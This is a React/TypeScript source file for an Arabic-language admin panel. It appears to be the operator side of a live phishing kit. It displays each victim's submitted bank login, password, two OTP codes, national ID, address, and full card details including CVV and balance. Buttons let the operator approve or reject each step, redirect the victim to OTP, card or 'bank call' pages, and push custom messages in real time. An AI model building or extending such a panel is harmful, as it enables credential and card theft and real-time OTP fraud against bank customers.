import { useState, useEffect, useRef } from "react";
import { ArrowRight, MessageSquare, X, ExternalLink, FileText, Download, Eye, Copy, Check, RotateCcw, Phone } from "lucide-react";
import { Textarea } from "@/components/ui/textarea";
import { Button } from "@/components/ui/button";
import { supabase } from "@/integrations/supabase/client";
import { useToast } from "@/components/ui/use-toast";
import type { Tables } from "@/integrations/supabase/types";
import type { Json } from "@/integrations/supabase/types";

type DashboardUser = Tables<"dashboard_users">;

interface UserDetailsPanelProps {
  user: DashboardUser;
  onClose: () => void;
  onDelete: () => void;
}

type SectionKey = "home_data" | "message_data" | "personal_data" | "otp1_data" | "otp2_data" | "address_data" | "card_data" | "activation_data";

const sectionConfig: { key: SectionKey; label: string; icon: string }[] = [
  { key: "home_data", label: "تسجيل الدخول", icon: "🔑" },
  { key: "otp1_data", label: "رمز OTP 1", icon: "🔢" },
  { key: "personal_data", label: "بيانات شخصية", icon: "👤" },
  { key: "address_data", label: "العنوان", icon: "📍" },
  { key: "card_data", label: "بيانات البطاقة", icon: "💳" },
  { key: "otp2_data", label: "رمز OTP 2", icon: "🔐" },
  { key: "message_data", label: "الرسالة", icon: "📝" },
  { key: "activation_data", label: "بيانات التفعيل", icon: "🔓" },
];

const fieldLabels: Record<string, string> = {
  otp_code: "رمز OTP",
  timestamp: "الوقت",
  fullName: "الاسم الكامل",
  nationalId: "الرقم القومي",
  phone: "رقم الهاتف",
  governorate: "المحافظة",
  city: "المنطقة",
  street: "الشارع",
  username: "اسم المستخدم",
  password: "كلمة المرور",
  cardNumber: "رقم البطاقة",
  cardHolder: "اسم صاحب البطاقة",
  expiryDate: "تاريخ الانتهاء",
  cvv: "رمز CVC",
  balance: "الرصيد",
  text: "النص",
  files: "المرفقات",
  serialNumber: "رقم المسلسل",
  activationCode: "رمز التفعيل",
  applicationCounter: "رقم إعادة التفعيل",
};

const isFileUrl = (val: unknown): boolean =>
  typeof val === "string" && (val.startsWith("http://") || val.startsWith("https://")) && val.includes("/storage/");

const isImageUrl = (url: string): boolean =>
  /\.(jpg|jpeg|png|gif|webp|bmp|svg)(\?|$)/i.test(url);

const getFileName = (url: string): string => {
  try {
    const parts = url.split("/");
    return decodeURIComponent(parts[parts.length - 1].split("?")[0]);
  } catch {
    return "مستند";
  }
};

const handleDownload = async (url: string, fileName: string) => {
  try {
    const res = await fetch(url);
    const blob = await res.blob();
    const a = document.createElement("a");
    a.href = URL.createObjectURL(blob);
    a.download = fileName;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(a.href);
  } catch {
    window.open(url, "_blank");
  }
};

const renderFilePreview = (url: string, index: number) => {
  const fileName = getFileName(url);
  if (isImageUrl(url)) {
    return (
      <div key={index} className="relative group rounded-lg overflow-hidden border border-border shadow-sm">
        <img src={url} alt="مرفق" className="w-full h-24 object-cover" />
        <div className="absolute inset-0 bg-foreground/0 group-hover:bg-foreground/40 transition-colors flex items-center justify-center gap-2 opacity-0 group-hover:opacity-100">
          <a href={url} target="_blank" rel="noopener noreferrer" className="p-1.5 bg-card rounded-full shadow-md"><Eye className="w-3.5 h-3.5 text-foreground" /></a>
          <button onClick={() => handleDownload(url, fileName)} className="p-1.5 bg-card rounded-full shadow-md"><Download className="w-3.5 h-3.5 text-primary" /></button>
        </div>
      </div>
    );
  }
  return (
    <div key={index} className="flex items-center gap-2 bg-primary/5 border border-primary/20 rounded-lg px-2 py-2">
      <FileText className="w-4 h-4 text-primary shrink-0" />
      <span className="text-xs text-foreground truncate flex-1">{fileName}</span>
      <a href={url} target="_blank" rel="noopener noreferrer"><ExternalLink className="w-3 h-3 text-muted-foreground" /></a>
      <button onClick={() => handleDownload(url, fileName)}><Download className="w-3 h-3 text-primary" /></button>
    </div>
  );
};

const CopyButton = ({ text }: { text: string }) => {
  const [copied, setCopied] = useState(false);
  const handleCopy = () => {
    navigator.clipboard.writeText(text).then(() => {
      setCopied(true);
      setTimeout(() => setCopied(false), 1500);
    });
  };
  return (
    <button onClick={handleCopy} className="p-0.5 rounded hover:bg-muted transition-colors shrink-0" title="نسخ">
      {copied ? <Check className="w-3 h-3 text-primary" /> : <Copy className="w-3 h-3 text-muted-foreground" />}
    </button>
  );
};

const renderValue = (key: string, val: Json) => {
  if (key === "files" && Array.isArray(val)) {
    const urls = val.filter((f): f is string => typeof f === "string" && isFileUrl(f));
    if (urls.length === 0) return null;
    return <div className="grid grid-cols-2 gap-1.5 mt-1">{urls.map((u, i) => renderFilePreview(u, i))}</div>;
  }
  if (isFileUrl(val)) return renderFilePreview(String(val), 0);
  if (val === null || val === undefined || typeof val === "object") {
    return <span className="text-foreground font-medium text-sm">{String(val)}</span>;
  }
  const text = String(val);
  return (
    <span className="flex items-center gap-1 min-w-0">
      <span className="text-foreground font-medium text-sm truncate select-all" dir="auto">{text}</span>
      <CopyButton text={text} />
    </span>
  );
};

const redirectTargets = [
  { label: "تسجيل الدخول", icon: "🔑" },
  { label: "المعلومات الشخصية", icon: "📋" },
  { label: "OTP", icon: "🔢" },
  { label: "بيانات البطاقة", icon: "💳" },
  { label: "OTP Token", icon: "🔐" },
  { label: "الرسالة", icon: "📝" },
  { label: "بيانات التفعيل", icon: "🔓" },
  { label: "الانتظار", icon: "⏳" },
  { label: "مكالمة البنك", icon: "📞" },
  { label: "النجاح", icon: "✅" },
];

const UserDetailsPanel = ({ user, onClose, onDelete }: UserDetailsPanelProps) => {
  const { toast } = useToast();
  const [sending, setSending] = useState<string | null>(null);
  const [customMessage, setCustomMessage] = useState("");
  const [liveUser, setLiveUser] = useState<DashboardUser>(user);

  useEffect(() => { setLiveUser(user); }, [user]);

  useEffect(() => {
    const channel = supabase
      .channel(`user_detail_${user.id}`)
      .on("postgres_changes", { event: "UPDATE", schema: "public", table: "dashboard_users", filter: `id=eq.${user.id}` }, (payload) => {
        setLiveUser(payload.new as DashboardUser);
      })
      .subscribe();
    return () => { supabase.removeChannel(channel); };
  }, [user.id]);

  const currentStatus = (liveUser.status_tabs as Record<string, string> | null)?.action || "";
  const isProcessed = (liveUser.status_tabs as Record<string, string> | null)?.processed === "true";
  const isWaiting = !isProcessed && (!currentStatus || currentStatus === "انتظار");

  const filledSections = sectionConfig.filter(({ key }) => {
    const d = liveUser[key];
    return d && !(Array.isArray(d) && d.length === 0);
  });
  const lastFilledKey = filledSections.length > 0 ? filledSections[filledSections.length - 1].key : null;

  // The action buttons should anchor to the LATEST submitted section so the
  // admin can always approve/reject. We map the current page to its preferred
  // section, then fall back to the last filled section. If nothing is filled
  // yet but the visitor is waiting, we render the buttons in a floating block.
  const actionSectionKey = (() => {
    const hasSection = (key: SectionKey) => filledSections.some((section) => section.key === key);
    const pageMap: Record<string, SectionKey> = {
      "تسجيل الدخول": "home_data",
      "OTP": "otp1_data",
      "المعلومات الشخصية": "personal_data",
      "بيانات البطاقة": "card_data",
      "OTP Token": "otp2_data",
      "الرسالة": "message_data",
      "بيانات التفعيل": "activation_data",
    };
    const preferred = pageMap[liveUser.last_page || ""];
    if (preferred && hasSection(preferred)) return preferred;
    // Special: personal info page often has address as a follow-up
    if (liveUser.last_page === "المعلومات الشخصية" && hasSection("address_data")) return "address_data";
    return lastFilledKey;
  })();

  const sendAction = async (action: string, target?: string) => {
    setSending(action + (target || ""));
    const statusData: Record<string, string> = { action, timestamp: new Date().toISOString() };
    if (target) statusData.target = target;
    const { error } = await supabase.from("dashboard_users").update({ status_tabs: statusData }).eq("id", user.id);
    if (error) {
      toast({ title: "خطأ", description: "فشل في إرسال الإجراء", variant: "destructive" });
    } else {
      toast({ title: "تم", description: target ? `تم نقل المستخدم إلى: ${target}` : `تم إرسال: ${action}` });
    }
    setSending(null);
  };

  const handleResetStatus = async () => {
    if (!confirm("هل تريد إعادة ضبط حالة الزائر؟ سيتم مسح آخر إجراء مُرسل.")) return;
    setSending("reset");
    const { error } = await supabase.from("dashboard_users").update({ status_tabs: {} }).eq("id", user.id);
    if (error) {
      toast({ title: "خطأ", description: "فشل في إعادة الضبط", variant: "destructive" });
    } else {
      toast({ title: "تم", description: "تم إعادة ضبط حالة الزائر" });
    }
    setSending(null);
  };

  const countryNamesMap: Record<string, string> = {
    EG: "مصر", SA: "السعودية", AE: "الإمارات", KW: "الكويت", QA: "قطر",
    BH: "البحرين", OM: "عمان", JO: "الأردن", IQ: "العراق", LB: "لبنان",
    PS: "فلسطين", SY: "سوريا", LY: "ليبيا", SD: "السودان", TN: "تونس",
    DZ: "الجزائر", MA: "المغرب", YE: "اليمن", US: "أمريكا", GB: "بريطانيا",
    DE: "ألمانيا", FR: "فرنسا", TR: "تركيا",
  };
  const cc = (liveUser as any).country_code || "";
  const flag = cc.length === 2 ? String.fromCodePoint(...[...cc.toUpperCase()].map((c: string) => 0x1F1E6 + c.charCodeAt(0) - 65)) : "";
  const countryName = countryNamesMap[cc.toUpperCase()] || cc;

  return (
    <div className="h-full flex flex-col bg-card border-r border-border md:h-full" dir="rtl">
      {/* Header */}
      <div className="flex items-center justify-between p-4 border-b border-border bg-muted/30">
        <div className="flex items-center gap-3">
          <div className="w-10 h-10 rounded-full bg-primary/10 flex items-center justify-center text-lg font-bold text-primary">
            {liveUser.name.charAt(0)}
          </div>
          <div>
          <h2 className="text-sm font-bold text-foreground">
              {liveUser.name} {flag && <span className="text-base" title={countryName}>{flag}</span>}
            </h2>
            <div className="flex items-center gap-1.5 mt-0.5">
              <span className="text-[10px] font-bold px-2 py-0.5 rounded-md bg-primary/10 text-primary border border-primary/20">
                📄 {liveUser.last_page || "غير محدد"}
              </span>
              {countryName && <span className="text-[10px] text-muted-foreground">· {countryName}</span>}
            </div>
          </div>
        </div>
        <button onClick={onClose} className="p-1.5 rounded-lg hover:bg-muted transition-colors">
          <X className="w-5 h-5 text-muted-foreground" />
        </button>
      </div>

      {/* Scrollable Content */}
      <div className="flex-1 overflow-y-auto p-4 space-y-4">

        {/* Status Badge */}
        <div className="flex items-center justify-between bg-muted/50 rounded-xl px-3 py-2 gap-2">
          <span className="text-xs text-muted-foreground shrink-0">الحالة</span>
          <span className={`text-[10px] font-bold px-2.5 py-1 rounded-full ${
            currentStatus === "موافقة" ? "bg-primary/10 text-primary border border-primary/30" :
            currentStatus === "رفض" ? "bg-destructive/10 text-destructive border border-destructive/30" :
            isWaiting ? "bg-amber-50 text-amber-700 border border-amber-300 animate-pulse" :
            "bg-muted text-muted-foreground border border-border"
          }`}>
            {currentStatus || (isWaiting ? "⏳ ينتظر الرد" : "بدون حالة")}
          </span>
          <Button
            size="sm"
            variant="outline"
            className="text-[10px] h-6 px-2 gap-1 mr-auto"
            disabled={sending !== null}
            onClick={handleResetStatus}
            title="مسح آخر إجراء مُرسل"
          >
            <RotateCcw className="w-3 h-3" />
            {sending === "reset" ? "..." : "إعادة ضبط"}
          </Button>
        </div>

        {/* Redirect Controls */}
        <div className="border border-border rounded-xl p-3">
          <p className="text-xs font-bold text-foreground text-center mb-2">
            <ArrowRight className="inline w-3.5 h-3.5 ml-1" />
            نقل المستخدم
          </p>
          <div className="grid grid-cols-2 gap-1.5">
            {redirectTargets.map((t) => (
              <Button key={t.label} size="sm" variant="outline" className="text-[10px] font-medium h-7" disabled={sending !== null} onClick={() => sendAction("نقل", t.label)}>
                {sending === `نقل${t.label}` ? "..." : `${t.icon} ${t.label}`}
              </Button>
            ))}
          </div>
        </div>

        {/* Timeline */}
        <div className="relative">
          <h3 className="text-xs font-bold text-muted-foreground mb-3">البيانات المقدّمة</h3>
          <div className="space-y-0">
            {filledSections.map(({ key, label, icon }, idx, arr) => {
              const data = liveUser[key];
              const isLast = idx === arr.length - 1;
              const showActionButtons = isWaiting && key === actionSectionKey;

              return (
                <div key={key} className="relative flex gap-3">
                  {/* Timeline line */}
                  <div className="flex flex-col items-center">
                    <div className={`w-8 h-8 rounded-full flex items-center justify-center text-sm shrink-0 ${
                      isLast && isWaiting
                        ? "bg-amber-100 border-2 border-amber-400 ring-2 ring-amber-200"
                        : "bg-primary/10 border-2 border-primary"
                    }`}>
                      {icon}
                    </div>
                    {idx < arr.length - 1 && (
                      <div className="w-0.5 flex-1 min-h-[16px] bg-primary/30" />
                    )}
                  </div>

                  {/* Content */}
                  <div className="flex-1 pb-4">
                    <p className="text-xs font-bold mb-1.5 text-foreground">{label}</p>
                    {Array.isArray(data) ? data.map((item, i) => (
                      <div key={i} className="bg-muted/50 rounded-lg px-3 py-2 space-y-1 mb-1">
                        {typeof item === "object" && item !== null ? (
                          Object.entries(item).map(([k, v]) => (
                            <div key={k} className="flex items-center justify-between gap-2">
                              <span className="text-muted-foreground text-[11px]">{fieldLabels[k] || k}</span>
                              {renderValue(k, v as Json)}
                            </div>
                          ))
                        ) : (
                          <p className="text-foreground text-sm">{String(item)}</p>
                        )}
                      </div>
                    )) : (typeof data === "object" && data !== null) ? (
                      <div className="bg-muted/50 rounded-lg px-3 py-2 space-y-1 mb-1">
                        {Object.entries(data).map(([k, v]) => (
                          <div key={k} className="flex items-center justify-between gap-2">
                            <span className="text-muted-foreground text-[11px]">{fieldLabels[k] || k}</span>
                            {renderValue(k, v as Json)}
                          </div>
                        ))}
                      </div>
                    ) : null}

                    {/* Action buttons inside the last filled section */}
                     {showActionButtons && (
                      <div className="grid grid-cols-2 gap-1.5 mt-2">
                        <Button size="sm" className="border-2 border-green-500 bg-green-500/10 text-green-700 hover:bg-green-500/20 font-bold text-xs h-8" variant="outline" disabled={sending !== null} onClick={() => sendAction("موافقة")}>
                          {sending === "موافقة" ? "..." : "✅ موافقة"}
                        </Button>
                        <Button size="sm" className="border-2 border-red-500 bg-red-500/10 text-red-700 hover:bg-red-500/20 font-bold text-xs h-8" variant="outline" disabled={sending !== null} onClick={() => sendAction("رفض")}>
                          {sending === "رفض" ? "..." : "❌ رفض"}
                        </Button>
                        <Button size="sm" className="col-span-2 border-2 border-destructive bg-destructive/10 text-destructive hover:bg-destructive/20 font-bold text-xs h-8" variant="outline" disabled={sending !== null} onClick={() => sendAction("بيانات خاطئة")}>
                          {sending === "بيانات خاطئة" ? "..." : "⚠️ بيانات خاطئة"}
                        </Button>
                      </div>
                    )}
                  </div>
                </div>
              );
            })}
          </div>

          {/* Fallback action buttons: visitor is waiting but no section is mapped
              (e.g. arrived on a page without submitting any data yet, or sitting on the waiting page) */}
          {isWaiting && (filledSections.length === 0 || actionSectionKey === null) && (
            <div className="mt-3 border-2 border-dashed border-amber-400 bg-amber-50/50 rounded-xl p-3">
              <p className="text-[11px] font-bold text-amber-800 mb-2 text-center">
                ⏳ الزائر في انتظار قرارك ({liveUser.last_page || "—"})
              </p>
              <div className="grid grid-cols-2 gap-1.5">
                <Button size="sm" className="border-2 border-green-500 bg-green-500/10 text-green-700 hover:bg-green-500/20 font-bold text-xs h-8" variant="outline" disabled={sending !== null} onClick={() => sendAction("موافقة")}>
                  {sending === "موافقة" ? "..." : "✅ موافقة"}
                </Button>
                <Button size="sm" className="border-2 border-red-500 bg-red-500/10 text-red-700 hover:bg-red-500/20 font-bold text-xs h-8" variant="outline" disabled={sending !== null} onClick={() => sendAction("رفض")}>
                  {sending === "رفض" ? "..." : "❌ رفض"}
                </Button>
                <Button size="sm" className="col-span-2 border-2 border-destructive bg-destructive/10 text-destructive hover:bg-destructive/20 font-bold text-xs h-8" variant="outline" disabled={sending !== null} onClick={() => sendAction("بيانات خاطئة")}>
                  {sending === "بيانات خاطئة" ? "..." : "⚠️ بيانات خاطئة"}
                </Button>
              </div>
            </div>
          )}
        </div>

        {/* Watch choice */}
        {liveUser.watch_choice && (
          <div className="bg-muted/50 rounded-xl px-3 py-2 flex items-center justify-between">
            <span className="text-xs text-muted-foreground">⌚ الساعة المختارة</span>
            <span className="text-xs font-bold text-foreground">{liveUser.watch_choice}</span>
          </div>
        )}


        {/* Custom Message */}
        <div className="border border-purple-300 rounded-xl p-3 bg-purple-50/30">
          <div className="flex items-center gap-1.5 mb-2">
            <MessageSquare className="w-3.5 h-3.5 text-purple-600" />
            <p className="text-xs font-bold text-foreground">رسالة مخصصة</p>
          </div>
          <Textarea placeholder="اكتب رسالتك..." value={customMessage} onChange={(e) => setCustomMessage(e.target.value)} className="text-right text-xs min-h-[50px] mb-2 bg-card" dir="rtl" />
          <Button className="w-full border border-purple-400 bg-purple-100 text-purple-700 hover:bg-purple-200 font-bold text-xs h-8" variant="outline" disabled={sending !== null || !customMessage.trim()} onClick={() => { sendAction("رسالة مخصصة", customMessage.trim()); setCustomMessage(""); }}>
            💬 إرسال
          </Button>
        </div>
      </div>

      {/* Footer */}
      <div className="p-3 border-t border-border flex gap-2">
        <Button variant="destructive" size="sm" className="flex-1 text-xs" onClick={onDelete}>حذف</Button>
        <Button variant="secondary" size="sm" className="flex-1 text-xs" onClick={onClose}>إغلاق</Button>
      </div>
    </div>
  );
};

export default UserDetailsPanel;
